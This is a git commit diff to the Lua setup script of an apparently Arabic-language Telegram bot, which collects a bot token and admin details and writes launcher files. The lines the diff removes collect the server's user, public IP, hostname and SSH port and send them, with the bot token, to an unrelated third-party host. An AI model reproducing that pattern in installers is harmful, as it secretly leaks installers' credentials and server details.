8394116cf8401174b218bcc4d5f9b2d9a911f0cc
Tubaktele <81114033+Tubaktele@users.noreply.github.com>
2021-05-25 18:47:34 +0300

    Add files via upload

--- start.lua
+++ start.lua
@@ -1,86 +1,81 @@
-database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
 serpent = dofile("./File_Libs/serpent.lua")
-JSON    = dofile("./File_Libs/dkjson.lua")
-json    = dofile("./File_Libs/JSON.lua")
-URL = dofile("./File_Libs/url.lua")
 https = require("ssl.https")
 http = require("socket.http")
-Server_Done = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-User = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
-IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
-Name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
-Port = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
-Time = io.popen("date +'%Y/%m/%d %T'"):read('*a'):gsub('[\n\r]+', '')
-local AutoFiles_Write = function() 
-local Create_Info = function(Token,Sudo)  
-local Write_Info_Sudo = io.open("sudo.lua", 'w')
-Write_Info_Sudo:write([[
-
-s = "BGBBB"
-
-q = "FBBBBB"
-
+JSON = dofile("./File_Libs/JSON.lua")
+local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
+Server_TuBak = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+local AutoFiles_TuBak = function() 
+local Create_Info = function(Token,Sudo,UserName)  
+local TuBak_Info_Sudo = io.open("sudo.lua", 'w')
+TuBak_Info_Sudo:write([[
 token = "]]..Token..[["
 
 Sudo = ]]..Sudo..[[  
 
+UserName = "]]..UserName..[["
 ]])
-Write_Info_Sudo:close()
+TuBak_Info_Sudo:close()
 end  
-if not database:get(Server_Done.."Token_Write") then
+if not database:get(Server_TuBak.."Token_TuBak") then
 print("\27[1;34m»» Send Your Token Bot :\27[m")
 local token = io.read()
 if token ~= '' then
 local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
 if res ~= 200 then
-io.write('\n\27[1;31mSorry The Token is not Correct \n\27[0;39;49m')
+io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
 else
-io.write('\n\27[1;31mThe Token Is Saved\n\27[0;39;49m')
-database:set(Server_Done.."Token_Write",token)
+io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
+database:set(Server_TuBak.."Token_TuBak",token)
 end 
 else
 io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
 end 
 os.execute('lua start.lua')
 end
-if not database:get(Server_Done.."UserSudo_Write") then
-print("\27[1;34mSend Your Id Sudo :\27[m")
-local Id = io.read():gsub(' ','') 
-if tostring(Id):match('%d+') then
-data,res = https.request("https://anashtick.ml/Tubak.php?id=info&id="..Id)
-if res == 200 then
-muaed = json:decode(data)
-if muaed.Info.info == 'Is_Spam' then
-io.write('\n\27[1;31mSorry The Id Is Prohibited From The Source\n\27[0;39;49m')
-os.execute('lua start.lua')
-end ---ifBn
-if muaed.Info.info == 'Ok' then
-io.write('\n\27[1;31m The Id Is Saved\n\27[0;39;49m')
-database:set(Server_Done.."UserSudo_Write",Id)
-end ---ifok
-else
-io.write('\n\27[1;31mThe Id was not Saved\n\27[0;39;49m')
-end  ---ifid
-os.execute('lua start.lua')
-end ---ifnot
+------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------
+if not database:get(Server_TuBak.."UserName_TuBak") then
+print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
+local UserName = io.read():gsub('@','')
+if UserName ~= '' then
+local Get_Info = http.request("http://tshake.ml/info/?user="..UserName)
+if Get_Info:match('Is_Spam') then
+io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
+return false
 end
-local function Files_Info_Get()
-Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
-local t = json:decode(https.request('https://black-source.tk/BlackTeAM/index.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
-print("::Black::")
-local RunBot = io.open("TuBak", 'w')
-RunBot:write([[
+local Json = JSON:decode(Get_Info)
+if Json.Info == false then
+io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
+os.execute('lua start.lua')
+else
+if Json.Info == 'Channel' then
+io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
+os.execute('lua start.lua')
+else
+io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
+database:set(Server_TuBak.."UserName_TuBak",Json.Info.Username)
+database:set(Server_TuBak.."Id_TuBak",Json.Info.Id)
+end
+end
+else
+io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
+end 
+os.execute('lua start.lua')
+end
+local function Files_TuBak_Info()
+Create_Info(database:get(Server_TuBak.."Token_TuBak"),database:get(Server_TuBak.."Id_TuBak"),database:get(Server_TuBak.."UserName_TuBak"))   
+local RunTuBak = io.open("TuBak", 'w')
+RunTuBak:write([[
 #!/usr/bin/env bash
 cd $HOME/TuBak
-token="]]..database:get(Server_Done.."Token_Write")..[["
-rm -fr TuBak.lua
-wget "https://raw.githubusercontent.com/TubakTele/TuBak/main/TuBak.lua"
+token="]]..database:get(Server_TuBak.."Token_TuBak")..[["
+      
 while(true) do
 rm -fr ../.telegram-cli
 ./tg -s ./TuBak.lua -p PROFILE --bot=$token
 done
 ]])
-RunBot:close()
+RunTuBak:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
@@ -93,19 +88,19 @@ done
 ]])
 RunTs:close()
 end
-Files_Info_Get()
-database:del(Server_Done.."Token_Write");database:del(Server_Done.."UserSudo_Write")
+Files_TuBak_Info()
+database:del(Server_TuBak.."Token_TuBak");database:del(Server_TuBak.."Id_TuBak");database:del(Server_TuBak.."UserName_TuBak")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 end 
 local function Load_File()  
 local f = io.open("./sudo.lua", "r")  
 if not f then   
-AutoFiles_Write()  
+AutoFiles_TuBak()  
 var = true
 else   
 f:close()  
-database:del(Server_Done.."Token_Write");database:del(Server_Done.."UserSudo_Write")
+database:del(Server_TuBak.."Token_TuBak");database:del(Server_TuBak.."Id_TuBak");database:del(Server_TuBak.."UserName_TuBak")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 var = false
